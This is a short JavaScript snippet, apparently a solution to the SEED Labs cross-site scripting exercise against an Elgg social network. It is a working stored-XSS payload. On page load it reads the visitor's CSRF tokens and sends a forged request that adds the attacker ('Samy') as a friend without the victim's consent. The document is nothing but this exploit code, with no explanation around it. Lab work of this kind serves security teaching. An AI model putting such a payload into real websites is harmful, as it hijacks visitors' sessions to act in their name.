<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var urlHeader= "http://www.seed-server.com/action/friends/add?friend="+elgg.page_owner.guid ;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl=urlHeader+ts+token+ts+token;

	//Create and send Ajax request to add friend
    if(elgg.session.user.guid!=elgg.page_owner.guid)
	{
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
    }
	}
</script>